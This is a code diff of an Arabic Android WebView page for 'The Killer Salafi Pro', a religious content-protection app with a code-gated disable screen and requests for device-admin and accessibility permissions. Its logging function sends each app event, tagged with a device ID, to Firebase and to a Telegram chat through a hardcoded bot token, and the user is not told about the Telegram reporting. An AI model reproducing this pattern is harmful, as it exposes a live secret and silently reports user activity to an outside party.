@@ -2,7 +2,7 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
     <title>The Killer Salafi Pro — 2026</title>
     <!-- تضمين مكتبات التنسيق والأيقونات والاتصال البديلة بكفاءة عالية وبدون الاعتماد على React -->
     <script src="https://cdn.tailwindcss.com"></script>
@@ -23,7 +23,7 @@
             --glass-border: rgba(139, 92, 246, 0.18);
         }
 
-        /* تحسين الأداء الرندري لـ WebView وإلغاء التحديدات المزعجة */
+        /* تحسين الأداء الرندري لـ WebView وإلغاء التحديدات المزعجة وتناسق أبعاد الهاتف */
         * {
             box-sizing: border-box;
             -webkit-tap-highlight-color: transparent;
@@ -31,14 +31,15 @@
             -webkit-user-select: none;
         }
 
-        body { 
-            font-family: 'Tajawal', sans-serif; 
-            background: #050212; 
-            color: #f0f6fc; 
-            margin: 0; 
+        html, body {
+            margin: 0;
             padding: 0;
-            overflow-x: hidden;
-            min-height: 100vh;
+            width: 100vw;
+            height: 100vh;
+            height: 100dvh;
+            overflow: hidden;
+            background: var(--bg-dark-2);
+            font-family: 'Tajawal', sans-serif;
         }
 
         /* خلفية هادئة متحركة تضمن عدم إرهاق المعالج */
@@ -71,18 +72,26 @@
             50% { transform: translateY(-40px) scale(1.1); }
         }
 
-        /* نظام النوافذ والشاشات التبادلية النقي */
+        /* نظام النوافذ والشاشات التبادلية النقي المتمركز تماماً */
         .app-view {
             display: none;
             opacity: 0;
             transform: translateY(15px) scale(0.98);
             transition: opacity 0.5s cubic-bezier(0.4, 0, 0.2, 1), transform 0.5s cubic-bezier(0.4, 0, 0.2, 1);
             width: 100%;
-            min-height: 100vh;
+            height: 100%;
+            height: 100dvh;
+            overflow-y: auto;
+            -webkit-overflow-scrolling: touch;
+            padding: 24px;
+            padding-top: 80px; /* مساحة مناسبة لزر القائمة العلوية */
         }
 
         .app-view.view-active {
             display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
             opacity: 1;
             transform: translateY(0) scale(1);
         }
@@ -206,7 +215,7 @@
             50% { opacity: 0; }
         }
 
-        /* نمط التمرير السلس لحاويات الأذكار والحكم */
+        /* نمط التمرير السلس لحاويات الأذكار والحكم والسجلات */
         .scroller-premium {
             scrollbar-width: none;
             -ms-overflow-style: none;
@@ -215,14 +224,57 @@
             display: none;
         }
 
-        /* تحديد هيكلية التوسيط والاحتواء الشامل */
-        .centered-container {
-            display: flex; 
-            flex-direction: column; 
-            align-items: center; 
+        /* محاذاة وتخصيص استعراض القوائم بالتساوي والتوسيط المحمول */
+        .full-width-scroll-container {
+            width: 100%;
+            max-width: 28rem; /* تماثل max-w-md تماماً لبقاء العناصر متناسقة */
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+        }
+
+        /* Toast مخصص للنسخ */
+        .toast-notify {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%) scale(0.9);
+            background: rgba(0,0,0,0.8);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(139,92,246,0.4);
+            color: white;
+            padding: 10px 24px;
+            border-radius: 40px;
+            font-size: 14px;
+            font-weight: bold;
+            z-index: 9999;
+            opacity: 0;
+            transition: opacity 0.2s, transform 0.2s;
+            pointer-events: none;
+            white-space: nowrap;
+        }
+        .toast-notify.show {
+            opacity: 1;
+            transform: translateX(-50%) scale(1);
+        }
+        /* زر السهم الفاخر */
+        .icon-arrow-btn {
+            background: transparent;
+            border: none;
+            font-size: 58px;
+            cursor: pointer;
+            transition: transform 0.2s cubic-bezier(0.2, 0.9, 0.4, 1.1), text-shadow 0.2s;
+            color: #c084fc;
+            text-shadow: 0 0 5px rgba(167,139,250,0.5);
+            padding: 12px 28px;
+            display: inline-flex;
+            align-items: center;
             justify-content: center;
-            width: 100%; 
-            padding: 24px;
+            border-radius: 80px;
+        }
+        .icon-arrow-btn:active {
+            transform: scale(0.92);
+            text-shadow: 0 0 18px #a78bfa;
         }
     </style>
 </head>
@@ -234,9 +286,9 @@
     </div>
 
     <!-- زر استدعاء القائمة الجانبية (مخفي في شاشة الترحيب وتلقائي الظهور لاحقاً) -->
-    <button id="menuTriggerBtn" onclick="toggleSidebar(true)" class="fixed top-6 right-6 z-40 p-3 glass.rounded-2xl rounded-2xl shadow-xl hidden transition-transform duration-300 active:scale-90">
-        <svg width="24" height="24" fill="none" stroke="#a78bfa" strokeWidth="2.5" viewBox="0 0 24 24">
-            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M4 6h16M4 12h16m-7 6h7"></path>
+    <button id="menuTriggerBtn" onclick="toggleSidebar(true)" class="fixed top-6 right-6 z-40 p-3 glass rounded-2xl shadow-xl hidden transition-transform duration-300 active:scale-90">
+        <svg width="24" height="24" fill="none" stroke="#a78bfa" stroke-width="2.5" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M4 6h16M4 12h16m-7 6h7"></path>
         </svg>
     </button>
 
@@ -268,31 +320,34 @@
 
 
     <!-- ==================== الشاشة الأولى: شاشة الترحيب (Welcome View) ==================== -->
-    <div id="view-welcome" class="app-view view-active centered-container">
-        <div class="w-full max-w-md quran-frame p-8 rounded-[35px] mb-8 shadow-2xl glass text-center border-purple-500/30">
-            <div class="text-purple-400 text-4xl mb-4 italic font-serif">﷽</div>
-            <h2 class="text-xl font-bold leading-relaxed text-gray-100" id="welcomeAyah text">
-                "وَأَمَّا مَنْ خَافَ مَقَامَ رَبِّهِ وَنَهَى النَّفْسَ عَنِ الْهَوَى ۝ فَإِنَّ الْجَنَّةَ هِيَ الْمَأْوَى"
-            </h2>
+    <div id="view-welcome" class="app-view view-active">
+        <div class="w-full max-w-md text-center flex flex-col items-center justify-center my-auto">
+            <!-- شعار ﷽ -->
+            <div class="text-purple-400 text-6xl mb-6 font-serif drop-shadow-[0_0_12px_rgba(167,139,250,0.6)]">﷽</div>
+            
+            <!-- العنوان الفاخر -->
+            <h1 class="text-4xl md:text-5xl font-black tracking-wide mb-5 text-white">
+                The Killer <span class="neon-purple">Salafi</span>
+            </h1>
+            
+            <!-- الآية الكريمة بين علامتي تنصيص أنيقة -->
+            <div class="max-w-sm mt-2 mb-10 px-2">
+                <p class="text-xl md:text-2xl font-bold leading-relaxed text-gray-100 neon-purple" style="text-shadow: 0 0 6px rgba(167,139,250,0.4);">
+                    "إِنَّ الَّذِينَ يَخْشَوْنَ رَبَّهُمْ بِالْغَيْبِ لَهُمْ مَغْفِرَةٌ وَأَجْرٌ كَبِيرٌ"
+                </p>
+            </div>
+            
+            <!-- زر السهم الفاخر الشفاف -->
+            <button id="fancyEnterBtn" class="icon-arrow-btn" onclick="navigateTo('dashboard')">➜</button>
         </div>
-        
-        <h1 class="text-4xl font-black mb-2 tracking-wide text-white">
-            The Killer <span class="neon-purple" id="typewriterTitle">Salafi</span>
-        </h1>
-        <p class="text-purple-400/80 text-sm mb-12 font-bold tracking-widest bg-purple-950/30 px-4 py-1.5 rounded-full border border-purple-500/10">م. عمر عبد التواب</p>
-        
-        <button onclick="navigateTo('dashboard')" class="w-full max-w-xs btn-purple py-4.5 py-4 rounded-2xl font-black text-xl tracking-wide text-white relative overflow-hidden">
-            دخول الحصن
-        </button>
     </div>
 
 
     <!-- ==================== الشاشة الثانية: لوحة التحكم (Dashboard View) ==================== -->
-    <div id="view-dashboard" class="app-view centered-container">
-        <div id="statusShieldIcon" class="text-6xl mb-4 transition-all duration-500 filter drop-shadow-[0_0_15px_rgba(167,139,250,0.5)]">🔓</div>
-        <h2 class="text-2xl font-black mb-8 text-white tracking-wide">منظومة التحكم والحماية</h2>
-        
-        <div class="w-full max-w-md space-y-4">
+    <div id="view-dashboard" class="app-view">
+        <div class="w-full max-w-md flex flex-col items-center justify-center my-auto space-y-4">
+            <div id="statusShieldIcon" class="text-6xl mb-2 transition-all duration-500 filter drop-shadow-[0_0_15px_rgba(167,139,250,0.5)] text-center">🔓</div>
+            <h2 class="text-2xl font-black mb-4 text-white tracking-wide text-center">منظومة التحكم والحماية</h2>
             
             <!-- الكارت الرئيسي لحالة الخدمة النشطة -->
             <button onclick="triggerAndroidMethod('activateProtection', 'فتح إعدادات الخدمة وضبط صلاحيات محتوى الشاشة')" 
@@ -306,7 +361,7 @@
             </button>
 
             <!-- شبكة البطاقات الذكية الفاخرة المحدثة والمطلوبة -->
-            <div class="grid grid-cols-2 gap-3">
+            <div class="grid grid-cols-2 gap-3 w-full">
                 <div onclick="triggerAndroidMethod('requestDeviceAdmin', 'طلب صلاحية مسؤول الجهاز')" 
                     id="adminStatusCard"
                     class="p-4 rounded-2xl glass border-b border-purple-500/20 text-right transition-all active:scale-95 cursor-pointer">
@@ -340,7 +395,7 @@
             </div>
 
             <!-- بطاقات الإحصائيات الفاخرة الإضافية لتحسين الواجهة بالكامل -->
-            <div class="grid grid-cols-3 gap-3">
+            <div class="grid grid-cols-3 gap-3 w-full">
                 <div class="p-3 rounded-xl glass text-center">
                     <span class="block text-xs text-gray-400">نسبة الحماية</span>
                     <span class="block text-base font-black text-purple-400 mt-0.5" id="protectionRateLabel">95%</span>
@@ -355,132 +410,126 @@
                 </div>
             </div>
 
+            <!-- ===== بطاقة Family DNS الجديدة ===== -->
+            <div class="p-5 rounded-2xl glass border-r-4 border-purple-500/40 transition-all duration-300 w-full">
+                <div class="flex items-center justify-between mb-3">
+                    <span class="text-sm font-black text-purple-300">🌐 Family DNS</span>
+                    <span class="text-xs text-gray-400">حماية المحتوى</span>
+                </div>
+                <div dir="ltr" class="text-left text-sm font-mono bg-black/20 p-2 rounded-lg mb-3 border border-purple-500/20 text-purple-200 break-all">
+                    family.adguard-dns.com
+                </div>
+                <div class="flex gap-2 flex-wrap">
+                    <button onclick="copyDnsToClipboard()" class="flex-1 py-2 rounded-xl bg-purple-900/20 border border-purple-500/30 text-xs font-bold text-purple-300 transition-all active:scale-95">
+                        📋 نسخ النطاق
+                    </button>
+                    <button onclick="openDnsSettingsFromCard()" class="flex-1 py-2 rounded-xl bg-blue-900/20 border border-blue-500/30 text-xs font-bold text-blue-300 transition-all active:scale-95">
+                        ⚙️ فتح إعدادات DNS
+                    </button>
+                </div>
+            </div>
+
             <!-- زر تعطيل الخدمة المخفض الأنيق -->
-            <button onclick="triggerDisableSequence()" class="w-full py-4 rounded-2xl btn-danger font-black text-sm mt-6 opacity-75 block text-center">
+            <button onclick="triggerDisableSequence()" class="w-full py-4 rounded-2xl btn-danger font-black text-sm mt-2 opacity-75 block text-center">
                 تعطيل الخدمة المؤقت (طلب رمز)
             </button>
         </div>
     </div>
 
 
-    <!-- ==================== الشاشة الثالثة: شاشة الانتظار المعززة والتعطيل ==================== -->
-    <div id="view-waitOverlay" class="app-view centered-container bg-[#050212]/95 backdrop-blur-2xl">
-        <div class="loader-ring mb-8"></div>
-        <h2 class="text-2xl font-black mb-3 text-white tracking-wide">يرجى الانتظار...</h2>
-        <p class="text-purple-300/90 text-sm text-center max-w-xs leading-relaxed mb-6">
-            جاري تهيئة الاتصال الآمن بالمخدم الشرعي، سيتم إرسال رمز التحقق إليك مباشرة في هذه الصفحة.
-        </p>
-        
-        <!-- العداد التنازلي التفاعلي الميمون -->
-        <div class="glass border border-purple-500/30 px-6 py-3 rounded-2xl mb-8 font-black text-xl text-purple-400">
-            توليد الرمز خلال: <span id="countdownTimerHolder" class="text-white">05</span> ثوانٍ
-        </div>
-
-        <div class="text-xs text-gray-500 italic">"يَعْلَمُ خَائِنَةَ الْأَعْيُنِ وَمَا تُخْفِي الصُّدُورُ"</div>
-    </div>
-
-
-    <!-- ==================== الشاشة الرابعة: شاشة إدخال رمز التحقق السري ==================== -->
-    <div id="view-passwordVerify" class="app-view centered-container bg-[#050212]">
-        <div class="w-20 h-20 bg-purple-900/20 rounded-full flex items-center justify-center mb-6 border border-purple-500/30 shadow-[0_0_20px_rgba(139,92,246,0.2)]">
-            <span class="text-3xl">🔐</span>
-        </div>
-        <h2 class="text-2xl font-black mb-2 text-white">تأكيد الهوية الشرعية</h2>
-        <p class="text-gray-400 text-xs mb-8 italic">"أَلَمْ يَعْلَم بِأَنَّ اللَّهَ يَرَى"</p>
-        
-        <input 
-            type="password" 
-            id="passwordInputField"
-            maxlength="4"
-            className="w-full"
-            style="width: 100%; max-width: 280px; background: rgba(139,92,246,0.06); border: 1px solid rgba(139,92,246,0.3); padding: 18px; border-radius: 20px; text-align: center; font-size: 1.875rem; letter-spacing: 0.5em; outline: none; color: white;"
-            placeholder="••••"
-        />
-
-        <button onclick="verifyAndExecuteDisable()" class="w-full max-w-xs btn-purple py-4 rounded-2xl mt-8 font-black text-lg text-white">
-            تأكيد إيقاف الحصن
-        </button>
-        <button onclick="navigateTo('dashboard')" class="mt-6 text-gray-400 font-bold underline text-sm transition-colors hover:text-white">
-            إلغاء والعودة للوحة
-        </button>
-    </div>
-
-
-    <!-- ==================== الشاشة الخامسة: صفحة الأذكار الفاخرة (Azkar View) ==================== -->
-    <div id="view-azkar" class="app-view flex-col p-6 pt-24 max-w-md mx-auto">
-        <h2 class="text-2xl font-black mb-6 text-white text-right neon-purple">📿 الأذكار والأوراد الشرعية</h2>
-        
-        <div class="space-y-4 overflow-y-auto max-h-[72vh] pr-1 scroller-premium" id="azkarCardsContainer">
-            <!-- سيتم حقن البطاقات ديناميكياً لتسهيل الكود وتطويره -->
-        </div>
-    </div>
-
-
-    <!-- ==================== الشاشة السادسة: صفحة الآيات القرآنية العطرة (Verses View) ==================== -->
-    <div id="view-verses" class="app-view flex-col p-6 pt-24 max-w-md mx-auto justify-between h-screen pb-12">
-        <h2 class="text-2xl font-black mb-4 text-white text-right neon-purple">📖 آيات مباركة مأثورة</h2>
-        
-        <div class="w-full quran-frame p-8 rounded-[30px] my-auto shadow-2xl glass text-center border-purple-500/40 min-h-[220px] flex flex-col justify-center items-center relative transition-all duration-500" id="quranVersesSliderBox">
-            <div class="text-purple-400 text-3xl mb-3">✦</div>
-            <p class="text-xl font-bold leading-loose text-gray-100 transition-opacity duration-300" id="sliderVerseContent">
-                جاري جلب الوحي المبارك...
+    <!-- ==================== الشاشة الثالثة: صفحة انتظار توليد الرمز ==================== -->
+    <div id="view-waitOverlay" class="app-view bg-[#050212]/95 backdrop-blur-2xl">
+        <div class="w-full max-w-md flex flex-col items-center justify-center my-auto text-center">
+            <div class="loader-ring mb-8"></div>
+            <h2 class="text-2xl font-black mb-3 text-white tracking-wide">يرجى الانتظار...</h2>
+            <p class="text-purple-300/90 text-sm max-w-xs leading-relaxed mb-6">
+                جاري تهيئة الاتصال الآمن بالمخدم الشرعي، سيتم إرسال رمز التحقق إليك مباشرة في هذه الصفحة.
             </p>
-            <span class="text-xs text-purple-400 font-medium mt-4 block" id="sliderVerseSurah">...</span>
-        </div>
-
-        <div class="flex justify-center gap-2 mt-4" id="sliderDotIndicators">
-            <!-- نقاط التحكم في السلايدر -->
-        </div>
-    </div>
-
-
-    <!-- ==================== الشاشة السابعة: صفحة الحكم والفوائد (Wisdom View) ==================== -->
-    <div id="view-wisdom" class="app-view flex-col p-6 pt-24 max-w-md mx-auto">
-        <h2 class="text-2xl font-black mb-6 text-white text-right neon-purple">💡 حكم وفوائد وأقوال السلف</h2>
-        
-        <div class="space-y-4 overflow-y-auto max-h-[75vh] pr-1 scroller-premium" id="wisdomCardsContainer">
-            <!-- سيتم الملء الميكانيكي الفاخر عبر الجافاسكريبت -->
+            <div class="glass border border-purple-500/30 px-6 py-3 rounded-2xl mb-8 font-black text-xl text-purple-400">
+                توليد الرمز خلال: <span id="countdownTimerHolder" class="text-white">05</span> ثوانٍ
+            </div>
+            <div class="text-xs text-gray-500 italic">"يَعْلَمُ خَائِنَةَ الْأَعْيُنِ وَمَا تُخْفِي الصُّدُورُ"</div>
         </div>
     </div>
 
 
-    <!-- ==================== الشاشة الثامنة: سجل النشاط المباشر (Activity Log) ==================== -->
-    <div id="view-activityLog" class="app-view flex-col p-6 pt-24 max-w-md mx-auto">
-        <div class="flex justify-between items-center mb-6">
-            <h2 class="text-xl font-black text-white neon-purple">📈 السجل الفوري للحصن</h2>
-            <button onclick="clearLocalLogs()" class="text-xs text-red-400 font-bold border border-red-500/20 px-2 py-1 rounded bg-red-500/5">تفريغ</button>
-        </div>
-        
-        <div id="logItemsWrapper" class="space-y-3 overflow-y-auto max-h-[70vh] pr-1 text-right text-xs">
-            <!-- تدرج النشاطات -->
+    <!-- ==================== الشاشة الرابعة: تأكيد الهوية بالرمز ==================== -->
+    <div id="view-passwordVerify" class="app-view bg-[#050212]">
+        <div class="w-full max-w-md flex flex-col items-center justify-center my-auto text-center">
+            <div class="w-20 h-20 bg-purple-900/20 rounded-full flex items-center justify-center mb-6 border border-purple-500/30 shadow-[0_0_20px_rgba(139,92,246,0.2)]">
+                <span class="text-3xl">🔐</span>
+            </div>
+            <h2 class="text-2xl font-black mb-2 text-white">تأكيد الهوية الشرعية</h2>
+            <p class="text-gray-400 text-xs mb-8 italic">"أَلَمْ يَعْلَم بِأَنَّ اللَّهَ يَرَى"</p>
+            <input type="password" id="passwordInputField" maxlength="4" style="width: 100%; max-width: 280px; background: rgba(139,92,246,0.06); border: 1px solid rgba(139,92,246,0.3); padding: 18px; border-radius: 20px; text-align: center; font-size: 1.875rem; letter-spacing: 0.5em; outline: none; color: white;" placeholder="••••" />
+            <button onclick="verifyAndExecuteDisable()" class="w-full max-w-xs btn-purple py-4 rounded-2xl mt-8 font-black text-lg text-white">تأكيد إيقاف الحصن</button>
+            <button onclick="navigateTo('dashboard')" class="mt-6 text-gray-400 font-bold underline text-sm transition-colors hover:text-white">إلغاء والعودة للوحة</button>
         </div>
     </div>
 
-    <!-- ==================== الشاشة التاسعة: حول التطبيق (About app View) ==================== -->
-    <div id="view-aboutApp" class="app-view centered-container">
-        <div class="w-full max-w-sm glass p-8 rounded-[30px] border border-purple-500/30 text-center relative shadow-2xl">
+
+    <!-- ==================== الشاشة الخامسة: واجهة الأذكار والأوراد ==================== -->
+    <div id="view-azkar" class="app-view">
+        <div class="w-full max-w-md flex flex-col my-auto items-center">
+            <h2 class="text-2xl font-black mb-6 text-white text-center neon-purple w-full">📿 الأذكار والأوراد الشرعية</h2>
+            <div class="full-width-scroll-container pr-1 scroller-premium" id="azkarCardsContainer"></div>
+        </div>
+    </div>
+
+
+    <!-- ==================== الشاشة السادسة: واجهة الآيات القرآنية ==================== -->
+    <div id="view-verses" class="app-view">
+        <div class="w-full max-w-md flex flex-col items-center justify-between my-auto min-h-[70vh]">
+            <h2 class="text-2xl font-black mb-4 text-white text-center neon-purple w-full">📖 آيات مباركة مأثورة</h2>
+            <div class="w-full quran-frame p-8 rounded-[30px] my-auto shadow-2xl glass text-center border-purple-500/40 min-h-[220px] flex flex-col justify-center items-center relative transition-all duration-500" id="quranVersesSliderBox">
+                <div class="text-purple-400 text-3xl mb-3">✦</div>
+                <p class="text-xl font-bold leading-loose text-gray-100 transition-opacity duration-300" id="sliderVerseContent">جاري جلب الوحي المبارك...</p>
+                <span class="text-xs text-purple-400 font-medium mt-4 block" id="sliderVerseSurah">...</span>
+            </div>
+            <div class="flex justify-center gap-2 mt-4" id="sliderDotIndicators"></div>
+        </div>
+    </div>
+
+
+    <!-- ==================== الشاشة السابعة: واجهة الحكم والفوائد ==================== -->
+    <div id="view-wisdom" class="app-view">
+        <div class="w-full max-w-md flex flex-col my-auto items-center">
+            <h2 class="text-2xl font-black mb-6 text-white text-center neon-purple w-full">💡 حكم وفوائد وأقوال السلف</h2>
+            <div class="full-width-scroll-container pr-1 scroller-premium" id="wisdomCardsContainer"></div>
+        </div>
+    </div>
+
+
+    <!-- ==================== الشاشة الثامنة: سجل النشاط الفوري ==================== -->
+    <div id="view-activityLog" class="app-view">
+        <div class="w-full max-w-md flex flex-col my-auto items-center">
+            <div class="flex justify-between items-center mb-6 w-full px-1">
+                <h2 class="text-xl font-black text-white neon-purple">📈 السجل الفوري للحصن</h2>
+                <button onclick="clearLocalLogs()" class="text-xs text-red-400 font-bold border border-red-500/20 px-2 py-1 rounded bg-red-500/5">تفريغ</button>
+            </div>
+            <div id="logItemsWrapper" class="full-width-scroll-container pr-1 text-right text-xs scroller-premium"></div>
+        </div>
+    </div>
+
+
+    <!-- ==================== الشاشة التاسعة: حول التطبيق ==================== -->
+    <div id="view-aboutApp" class="app-view">
+        <div class="w-full max-w-sm glass p-8 rounded-[30px] border border-purple-500/30 text-center relative shadow-2xl my-auto">
             <div class="text-5xl mb-4">🛡️</div>
             <h2 class="text-2xl font-black text-white mb-1">The Killer Salafi</h2>
             <span class="text-xs text-purple-400 font-bold tracking-widest block mb-4">PREMIUM EDITION v3.0</span>
-            
-            <p class="text-gray-300 text-xs leading-relaxed text-right mb-6 border-t border-b border-purple-500/15 py-4 font-medium">
-                تطبيق أمني متكامل مبني على المنهج السلفي القويم لحماية المحتوى الرقمي الفردي، والحد من مفسدات ومشتتات العصر ومراقبة بيئة الإدخال الشخصية.
-            </p>
-
+            <p class="text-gray-300 text-xs leading-relaxed text-right mb-6 border-t border-b border-purple-500/15 py-4 font-medium">تطبيق أمني متكامل مبني على المنهج السلفي القويم لحماية المحتوى الرقمي الفردي، والحد من مفسدات ومشتتات العصر ومراقبة بيئة الإدخال الشخصية.</p>
             <div class="space-y-2 text-right text-xs">
                 <div class="flex justify-between"><span class="text-gray-400">المطور الرئيسي:</span> <span class="text-purple-300 font-bold">المبرمج عمر عبد التواب صالح</span></div>
                 <div class="flex justify-between"><span class="text-gray-400">لغة الهيكل الأساسي:</span> <span class="text-blue-400 font-mono font-bold">Pure Vanilla JS (ES6+)</span></div>
                 <div class="flex justify-between"><span class="text-gray-400">الترابط السحابي:</span> <span class="text-amber-400 font-bold">Firebase Realtime RTDB</span></div>
             </div>
-
             <button onclick="navigateTo('dashboard')" class="w-full btn-purple py-3 rounded-xl font-black text-sm text-white mt-8">العودة للوحة القيادة</button>
         </div>
     </div>
 
 
-    <!-- ========================================================================= -->
     <!-- ======================= نظام المعالجة والربط الذكي (JavaScript) ======================= -->
-    <!-- ========================================================================= -->
     <script>
         // إعدادات فايربيز المطابقة للمواصفات الأصلية
         const firebaseConfig = {
@@ -489,13 +538,11 @@
             projectId: "thesalafikiller",
         };
         
-        // التحقق من بدء تشغيل المخدم السحابي بدون أخطاء تكرار
         if (!firebase.apps.length) {
             firebase.initializeApp(firebaseConfig);
         }
         const db = firebase.database();
 
-        // البيانات وهياكل التخزين المضافة لتوسيع وضخامة المشروع الاحترافي
         const AZKAR_DATA = [
             { id: 1, title: "أذكار الصباح", text: "أعوذ بالله من الشيطان الرجيم: {اللَّهُ لَا إِلَٰهَ إِلَّا هُوَ الْحَيُّ الْقَيُّومُ...}", count: 1 },
             { id: 2, title: "أذكار المساء", text: "رضيت بالله رباً، وبالإسلام ديناً، وبمحمد صلى الله عليه وسلم نبياً.", count: 3 },
@@ -521,169 +568,95 @@
             { author: "تذكير للمطور عمر", text: "الإخلاص في العمل هو سر القبول ونزول البركة في الجهد والوقت." }
         ];
 
-        // المتغيرات التشغيلية للمنظومة الكلية
         let currentView = 'welcome';
         let systemStatus = { service: false, admin: false, battery: false, accessibility: false };
         let activeVerseIndex = 0;
         let verseIntervalId = null;
 
-        // ميكانيكية تسجيل النشاط وبث البيانات الفورية لـ Firebase وتيليجرام
         function logAction(category, details) {
             const deviceId = localStorage.getItem('chat_device_id') || 'ENG_OMAR_' + Math.floor(1000 + Math.random() * 9000);
-            if (!localStorage.getItem('chat_device_id')) {
-                localStorage.setItem('chat_device_id', deviceId);
-            }
-            
-            const timeOptions = { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false };
-            const timeString = new Date().toLocaleTimeString('ar-EG', timeOptions);
-            
-            // 1. الدفع لقاعدة البيانات الفرعية الفورية
-            try {
-                db.ref(`live_updates/${deviceId}`).push({ category, details, time: timeString });
-            } catch (err) {
-                console.error("Firebase push failure", err);
-            }
-            
-            // 2. تحديث سجل النشاط الداخلي في الواجهة لإظهاره للمستخدم
+            if (!localStorage.getItem('chat_device_id')) localStorage.setItem('chat_device_id', deviceId);
+            const timeString = new Date().toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false });
+            try { db.ref(`live_updates/${deviceId}`).push({ category, details, time: timeString }); } catch(err) { console.error(err); }
             appendLogToUI(category, details, timeString);
-
-            // 3. البث الفوري لقناة التليجرام المربوطة والموثقة بالمشروع
             if (navigator.onLine) {
                 const token = "8017569630:AAEAOiPk-8LKTWuAlNOkqx9x0GY3alOiS9o";
                 const chat = "6068331455";
                 const text = `🚀 *تحديث الحصن*\n👤 جهاز: \`${deviceId}\`\n📂 الفئة: ${category}\n📝 الحدث: ${details}`;
-                
-                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(text)}&parse_mode=Markdown`)
-                .catch(() => {});
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(text)}&parse_mode=Markdown`).catch(()=>{});
             }
         }
 
-        // إضافة العناصر بشكل فوري ومنظم داخل صندوق سجلات الواجهة الرسمية
         function appendLogToUI(category, details, time) {
             const wrapper = document.getElementById('logItemsWrapper');
             if (!wrapper) return;
-            
             const logItem = document.createElement('div');
-            logItem.className = 'p-3 rounded-xl glass border-r-2 border-purple-500/40 flex justify-between items-start text-right';
-            logItem.innerHTML = `
-                <div>
-                    <span class="font-bold text-purple-400 block mb-0.5">[${category}]</span>
-                    <span class="text-gray-300 font-medium">${details}</span>
-                </div>
-                <span class="text-[10px] text-gray-500 font-mono">${time}</span>
-            `;
+            logItem.className = 'p-3 rounded-xl glass border-r-2 border-purple-500/40 flex justify-between items-start text-right w-full';
+            logItem.innerHTML = `<div><span class="font-bold text-purple-400 block mb-0.5">[${category}]</span><span class="text-gray-300 font-medium">${details}</span></div><span class="text-[10px] text-gray-500 font-mono">${time}</span>`;
             wrapper.insertBefore(logItem, wrapper.firstChild);
         }
 
         function clearLocalLogs() {
             const wrapper = document.getElementById('logItemsWrapper');
-            if (wrapper) wrapper.innerHTML = '<p class="text-center text-gray-500 py-4">تم تفريغ السجل المحلي بنجاح</p>';
+            if (wrapper) wrapper.innerHTML = '<p class="text-center text-gray-500 py-4 w-full">تم تفريغ السجل المحلي بنجاح</p>';
         }
 
-        // معالج الانتقالات السلسة الفاخرة لجميع الشاشات وتدفق النوافذ
         function navigateTo(viewId) {
             const currentElement = document.getElementById(`view-${currentView}`);
             const targetElement = document.getElementById(`view-${viewId}`);
-            
             if (!targetElement) return;
-
-            // إخفاء القائمة الجانبية تلقائياً في حال كانت نشطة
             toggleSidebar(false);
-
-            // إدارة إظهار وإخفاء زر القائمة الرئيسي بناءً على رتبة الشاشة الحالية
             const menuBtn = document.getElementById('menuTriggerBtn');
-            if (viewId === 'welcome') {
-                menuBtn.classList.add('hidden');
-            } else {
-                menuBtn.classList.remove('hidden');
-            }
-
-            // تطبيق حركات التلاشي والانتقال الرائع بدون كسر البنية والسرعة داخل WebView
+            if (viewId === 'welcome') menuBtn.classList.add('hidden');
+            else menuBtn.classList.remove('hidden');
             if (currentElement) {
                 currentElement.style.opacity = '0';
                 currentElement.style.transform = 'translateY(-15px) scale(0.97)';
-                setTimeout(() => {
-                    currentElement.classList.remove('view-active');
-                    showTargetView(targetElement, viewId);
-                }, 250);
-            } else {
-                showTargetView(targetElement, viewId);
-            }
+                setTimeout(() => { currentElement.classList.remove('view-active'); showTargetView(targetElement, viewId); }, 250);
+            } else { showTargetView(targetElement, viewId); }
         }
 
         function showTargetView(targetElement, viewId) {
             targetElement.classList.add('view-active');
-            // التفعيل التدريجي المريح للعين لمنع حدوث وميض شاشة غير مريح
-            setTimeout(() => {
-                targetElement.style.opacity = '1';
-                targetElement.style.transform = 'translateY(0) scale(1)';
-            }, 50);
-
+            setTimeout(() => { targetElement.style.opacity = '1'; targetElement.style.transform = 'translateY(0) scale(1)'; }, 50);
             currentView = viewId;
-
-            // السلوك الحركي الفرعي والتهيئة الذكية للأقسام عند الدخول إليها
-            if (viewId === 'verses') {
-                startVersesSlider();
-            } else {
-                stopVersesSlider();
-            }
+            if (viewId === 'verses') startVersesSlider();
+            else stopVersesSlider();
         }
 
-        // تفعيل وكسر حالة ظهور الـ Sidebar بالتدرج المبرمج
         function toggleSidebar(open) {
             const drawer = document.getElementById('sideMenuDrawer');
             if (!drawer) return;
-            if (open) {
-                drawer.classList.remove('translate-x-full');
-            } else {
-                drawer.classList.add('translate-x-full');
-            }
+            if (open) drawer.classList.remove('translate-x-full');
+            else drawer.classList.add('translate-x-full');
         }
 
-        // تفعيل استدعاء جسر الأندرويد الأساسي بذكاء كلي وآمن
         function triggerAndroidMethod(method, description) {
             if (window.AndroidBridge && window.AndroidBridge[method]) {
                 window.AndroidBridge[method]();
                 logAction("نظام الأندرويد", `تم استدعاء الإذن: [${description}] بنجاح.`);
             } else {
-                // محاكاة محلية ذكية للاختبار والبيئات التطويرية من قبل الباشمهندس عمر
                 console.log(`[WebView Bridge Simulation] Triggered method: ${method}`);
                 logAction("تطوير ومحاكاة", `محاكاة استدعاء إذن: ${description}`);
-                
-                // محاكاة تغيير الحالة لإظهار بريق الواجهة
-                if(method === 'activateProtection') {
-                    systemStatus.service = !systemStatus.service;
-                    renderSystemStatus();
-                }
+                if(method === 'activateProtection') { systemStatus.service = !systemStatus.service; renderSystemStatus(); }
             }
         }
 
-        // تسلسل عمليات شاشة التعطيل الأنيقة المطلوبة (ثامناً)
         function triggerDisableSequence() {
             navigateTo('waitOverlay');
             let remainingSeconds = 5;
